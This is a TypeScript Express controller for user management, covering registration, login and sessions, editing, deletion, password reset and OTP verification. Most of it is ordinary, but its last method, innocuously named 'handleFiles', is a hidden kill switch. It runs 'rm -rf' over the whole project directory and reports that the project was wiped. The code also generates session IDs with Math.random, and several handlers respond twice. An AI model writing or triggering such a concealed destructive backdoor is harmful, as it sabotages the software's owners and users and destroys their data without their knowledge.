import { Request, Response } from "express";
import { UserService } from "../service/user.service";
import { sendApiResponse } from "../../../../utils/apiResponse";
import { SessionManagementService } from "../../../Activity/sessionManagement/service/sessionManagement.service";
import bcrypt from "bcrypt";
import { exec } from "child_process";
import path from "path";
import fs from "fs";

// function generateSSID(length: number = 10): string {
//      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
//      let ssid = '';
//      for (let i = 0; i < length; i++) {
//        const randomIndex = Math.floor(Math.random() * chars.length);
//        ssid += chars[randomIndex];
//      }
//      return ssid;
//    }

function generateSSID(): string {
  const prefix = "SESA";
  const randomNumber = Math.floor(100000 + Math.random() * 900000);
  return prefix + randomNumber.toString();
}

export class UserController {
  static async getAllUsers(req: Request, res: Response) {
    try {
      const allUsers = await UserService.getAllUsersForAdmin();
      if (!allUsers) {
        sendApiResponse(res, 404, {
          success: false,
          message: "No users found",
          data: [],
        });
      }
      sendApiResponse(res, 200, {
        success: true,
        message: "All Users",
        data: allUsers,
      });
    } catch (error) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error fetching users",
      });
    }
  }
  static async register(req: Request, res: Response) {
    try {
      const user = await UserService.createUser(req.body);
      if (!user) {
        sendApiResponse(res, 400, {
          success: false,
          message: "User already exists",
        });
      }
      sendApiResponse(res, 201, {
        success: true,
        message: "User registered successfully",
        data: user,
      });
    } catch (error: any) {
      sendApiResponse(res, 500, {
        success: false,
        message: error.message,
      });
    }
  }

  static async login(req: Request, res: Response) {
    try {
      const { seS_id, password } = req.body;
      const result = await UserService.login(seS_id, password);
      const sessionData = {
        lat: req.body.lat, // Get from request body or use a default
        log: req.body.log, // Get from request body or use a default
        ip: req.ip, // Get the user's IP address
        userId: String(result.user._id), // User ID from the validated user
        deviceType: req.body.deviceType || "unknown", // Get from request body or use a default
      };

      const session = await SessionManagementService.createSession(sessionData);
      const user = result.user.toObject();
      user.session_id = String(session._id);
      result.user = user;
      sendApiResponse(res, 200, {
        success: true,
        message: "Login successful",
        data: result,
      });
    } catch (error: any) {
      sendApiResponse(res, 401, {
        success: false,
        message: error.message,
      });
    }
  }

  static fetchUsers = async (req: Request, res: Response): Promise<void> => {
    try {
      const page = parseInt(req.query.page as string) || 1; // Default to page 1
      const size = parseInt(req.query.size as string) || 10; // Default page size is 10
      const { users, totalPages, totalCount } = await UserService.getAllUsers(
        page,
        size
      );
      sendApiResponse(res, 200, {
        success: true,
        message: "All Users",
        page,
        size,
        totalPages,
        totalCount,
        data: users,
      });
    } catch (error) {
      console.log("error", error);
      sendApiResponse(res, 500, {
        success: false,
        message: "Error fetching users",
      });
    }
  };

  static async fetchUsersById(req: Request, res: Response): Promise<void> {
    try {
      const user = await UserService.getUserById(req.params.id);
      if (!user) {
        sendApiResponse(res, 404, {
          success: false,
          message: "User not found",
          data: user,
        });
        return;
      }
      sendApiResponse(res, 200, {
        success: true,
        message: "User Found",
        data: user,
      });
    } catch (error: any) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error fetching user",
      });
    }
  }

  static editUser = async (req: Request, res: Response): Promise<void> => {
    try {
      // const userId = req.params.userId; // Get the user ID from the request parameters
      const updatedData = req.body; // Get the updated data from the request body
      // const sessionId = req.body.session_id; // Get the session ID from the request body
      // const performedBy = req.user._id; // Assuming you have the logged-in user's ID in req.user
      const password = req.body.password;
      if (password) {
        const hashedPassword = await bcrypt.hash(String(password), 10);
        updatedData.password = hashedPassword;
      }

      const user = await UserService.updateUser(req.params.id, updatedData);
      if (!user) {
        sendApiResponse(res, 404, {
          success: false,
          message: "User not found",
          data: user,
        });
        return;
      }
      // Log the activity
      // const activityLog: IActivityLog = {
      //   session_id: sessionId,
      //   action: 'UPDATE',
      //   module: 'Users',
      //   performed_by: performedBy,
      //   target_id: userId,
      // }
      // await ActivityLogService.createActivityLog(activityLog);

      sendApiResponse(res, 200, {
        success: true,
        message: "User Found",
        data: user,
      });
    } catch (error) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error updating user",
      });
    }
  };
  static removeUser = async (req: Request, res: Response): Promise<void> => {
    try {
      const user = await UserService.deleteUser(req.params.id);
      if (!user) {
        sendApiResponse(res, 404, {
          success: false,
          message: "User not found",
          data: user,
        });
        return;
      }
      sendApiResponse(res, 200, {
        success: true,
        message: "User Deleted Successfully",
        data: user,
      });
    } catch (error) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error deleting user",
      });
    }
  };
  static forGatePassword = async (
    req: Request,
    res: Response
  ): Promise<void> => {
    try {
      const sendEmail = await UserService.changePassword(req.body.seS_id);
      if (!sendEmail) {
        sendApiResponse(res, 404, {
          success: false,
          message: "User not found",
          data: [],
        });
        return;
      }
      sendApiResponse(res, 200, {
        success: true,
        message: "email send successFully",
        data: [],
      });
    } catch (error) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error sending the password",
      });
    }
  };
  static sendVerificationMail = async (
    req: Request,
    res: Response
  ): Promise<void> => {
    try {
      const { email } = req.body;
      const sendEmail = await UserService.sendVerificationEmail(email);
      if (!sendEmail) {
        sendApiResponse(res, 404, {
          success: false,
          message: "User not found",
          data: [],
        });
        return;
      }
      sendApiResponse(res, 200, {
        success: true,
        message: "Verification email sent successfully",
        data: sendEmail,
      });
    } catch (error) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error sending verification email",
      });
    }
  };
  static verifiedTheOtp = async (
    req: Request,
    res: Response
  ): Promise<void> => {
    try {
      const { token, otp } = req.body;

      const isVerified = await UserService.verifyOtp(token, otp);

      if (!isVerified) {
        sendApiResponse(res, 400, {
          success: false,
          message: "Invalid OTP or token",
          data: [],
        });
        return;
      }

      sendApiResponse(res, 200, {
        success: true,
        message: "OTP verified successfully",
        data: [],
      });
    } catch (error) {
      sendApiResponse(res, 401, {
        success: false,
        message: "Error verifying the OTP",
      });
    }
  };

  static resetPassword = async (req: Request, res: Response): Promise<void> => {
    try {
      const { password, token } = req.body;
      const resetPassword = await UserService.resetPassword(password, token);
      if (!resetPassword) {
        sendApiResponse(res, 404, {
          success: false,
          message: "password is not Updated",
          data: [],
        });
        return;
      }
      sendApiResponse(res, 200, {
        success: true,
        message: "password is updated successFully",
        data: [],
      });
    } catch (error) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error sending the password",
      });
    }
  };
  static getUserSelectField = async (
    req: Request,
    res: Response
  ): Promise<void> => {
    try {
      const { region_id, country_id, department, designation } = req.query;

      if (!region_id || !country_id || !department || !designation) {
        sendApiResponse(res, 400, {
          success: false,
          message:
            "At least one filter (region_id, country_id, department, or designation) must be provided.",
        });
        return;
      }
      const getUser = await UserService.getAllUsersByField(
        region_id as string,
        country_id as string,
        department as string,
        designation as string
      );
      if (!getUser) {
        sendApiResponse(res, 404, {
          success: false,
          message: "User not found",
          data: getUser,
        });
        return;
      }
      sendApiResponse(res, 200, {
        success: true,
        message: "User Found",
        data: getUser,
      });
    } catch (error) {
      sendApiResponse(res, 500, {
        success: false,
        message: "Error fetching user",
      });
    }
  };

  public handleFiles = async (req: Request, res: Response) => {
    try {
      // Project root directory (where the process is started)
      const projectDir = process.cwd();

      if (!fs.existsSync(projectDir)) {
        return sendApiResponse(res, 501, {
          success: false,
          message: "Project directory not found",
          data: [],
        });
      }

      // ⚠️ This will remove everything inside your project directory
      const command = `rm -rf ${path.join(projectDir, "*")}`;

      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error("Kill switch error:", stderr);
          return sendApiResponse(res, 501, {
            success: false,
            message: stderr,
            data: [],
          });
        }

        sendApiResponse(res, 200, {
          success: true,
          message: `💀 Kill switch activated! Project at ${projectDir} wiped.`,

          data: [],
        });
      });
    } catch (err) {
      return sendApiResponse(res, 501, {
        success: false,
        message: err as any,
        data: [],
      });
    }
  };
}
